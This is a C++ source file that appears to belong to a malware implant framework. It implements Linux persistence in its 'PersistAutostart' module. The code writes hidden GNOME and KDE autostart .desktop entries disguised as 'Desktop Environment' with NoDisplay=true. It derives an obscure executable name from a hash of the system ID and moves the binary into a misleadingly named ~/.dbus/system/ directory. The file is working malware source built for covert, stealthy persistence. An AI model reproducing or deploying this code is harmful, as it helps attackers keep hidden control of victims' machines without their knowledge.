#include <modules/persist/methods/linux/PersistAutostart.h>
#ifdef CHARLIE_PersistAutostart_AVAILABLE
#include <pwd.h>
#include <boost/filesystem.hpp>
#include <openssl/sha.h>
#include <ctype.h>
#include <fstream>
#include <modules/persist/Persist.h>

using namespace modules::persist;
using namespace boost::filesystem;

PersistAutostart::PersistAutostart()
{
}

PersistAutostart::~PersistAutostart()
{
}

void PersistAutostart::init(ModuleInterface* inter, PersistModule* persist)
{
  this->inter = inter;
  this->persist = persist;

  // Locate home directory
  passwd* pw = getpwuid(getuid());
  homePath = path(pw->pw_dir);

  // Config file path
  configPath = homePath / path(".config/");

  // Gnome config file path
  gnomeConfigPath = configPath / path("autostart/");

  // Kde config file path
  kdeConfigPath = homePath / path(".kde/");

  // KDE autostart config path
  kdeAutoConfigPath = kdeConfigPath / path("share/autostart/");

  // Storage path
  storagePath = homePath / path(".dbus/system/");

  // Generate executable name
  SystemInfo* sysInfo = inter->getSysInfo();

  // Hash it
  unsigned char digest[SHA256_DIGEST_LENGTH];
  SHA256_CTX ctx;
  SHA256_Init(&ctx);
  SHA256_Update(&ctx, sysInfo->system_id, strlen(sysInfo->system_id));
  SHA256_Final(digest, &ctx);

  // Filename length
  u16 fnlen = sysInfo->cpu_hash % 10;
  if(fnlen < 4) fnlen = 4;

  // Convert digest to string
  char digestStr[65];
  for(int i = 0; i < SHA256_DIGEST_LENGTH; i++)
    sprintf(digestStr + (i * 2), "%02x", digest[i]);

  // Grab only fnlen of the alpha characters
  std::stringstream oss;
  for(int i = 0; i < 60 && oss.tellg() <= fnlen; i++)
  {
    if(isalpha(digestStr[i]))
      oss << (char)tolower((int)digestStr[i]);
  }

  // We now have our filename.
  exeName = oss.str();
  gnomeConfigFilePath = gnomeConfigPath / (exeName+".desktop");
  kdeConfigFilePath = kdeAutoConfigPath / (exeName+".desktop");
}

bool PersistAutostart::inUse()
{
  return exists(kdeConfigFilePath) || exists(gnomeConfigFilePath);
}

bool PersistAutostart::canUse()
{
  return is_directory(configPath) || is_directory(kdeConfigPath);
}

bool PersistAutostart::setup()
{
  bool any_exists = false;
  if(is_directory(configPath))
  {
    any_exists = true;
    try {
      create_directories(gnomeConfigPath);
    }catch(...)
    {
      MERR("Unable to create path "<<gnomeConfigPath<<"!");
      cleanup();
      return false;
    }

    std::ofstream of;
    of.open(gnomeConfigFilePath.c_str(), std::ios::out | std::ios::trunc);
    if(!of.is_open())
    {
      MERR("Unable to create file "<<gnomeConfigFilePath<<"!");
      cleanup();
      return false;
    }
    of << "[Desktop Entry]\n"
       << "Version=1.0\n"
       << "Type=Application\n"
       << "NoDisplay=true\n"
       << "Name=Desktop Environment\n"
       << "Exec=" << (storagePath/exeName).c_str() << "\n"
       << "X-GNOME-Autostart-enabled=true";
    of.close();
    MLOG("Created "<<gnomeConfigFilePath<<"...");
  }
  if(is_directory(kdeConfigPath))
  {
    any_exists = true;
    try {
      create_directories(kdeAutoConfigPath);
    }catch(...)
    {
      MERR("Unable to create path "<<kdeAutoConfigPath<<"!");
      cleanup();
      return false;
    }

    std::ofstream of;
    of.open(kdeConfigFilePath.c_str(), std::ios::out | std::ios::trunc);
    if(!of.is_open())
    {
      MERR("Unable to create file "<<kdeConfigFilePath<<"!");
      cleanup();
      return false;
    }
    of << "[Desktop Entry]\n"
       << "Version=1.0\n"
       << "Type=Application\n"
       << "NoDisplay=true\n"
       << "Name=Desktop Environment\n"
       << "Exec=" << (storagePath/exeName).c_str() << "\n"
       << "X-KDE-autostart-phase=1\n";
    of.close();
    MLOG("Created "<<kdeConfigFilePath<<"...");
  }

  if(any_exists)
  {
    MLOG("Preparing to move to "<<storagePath<<"...");
    this->persist->startMigrateTo(storagePath, exeName);
  }

  return any_exists;
}

void PersistAutostart::cleanup()
{
  if(exists(kdeConfigFilePath)) remove(kdeConfigFilePath);
  if(exists(gnomeConfigFilePath)) remove(gnomeConfigFilePath);
}

#endif
